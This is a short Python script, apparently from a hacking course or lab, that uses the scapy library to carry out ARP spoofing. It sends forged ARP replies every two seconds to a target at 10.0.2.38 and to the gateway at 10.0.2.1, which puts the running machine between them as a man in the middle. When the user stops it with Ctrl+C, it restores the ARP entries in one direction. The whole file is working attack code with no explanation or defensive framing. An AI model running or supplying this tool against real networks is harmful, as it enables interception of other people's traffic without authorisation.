#!/usr/bin/env python

import time

import scapy.all as scapy


def scan(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def restore(destinaton_ip, source_ip):
    destinaton_mac = scan(destinaton_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=destinaton_ip, hwdst=destinaton_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


set_packets_count = 0
try:
    while True:
        spoof("10.0.2.38", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.38")
        set_packets_count = set_packets_count + 2
        print("\r[+] Packets send: " + str(set_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] You press on Ctrl + C")
    restore("10.0.2.38", "10.0.2.1")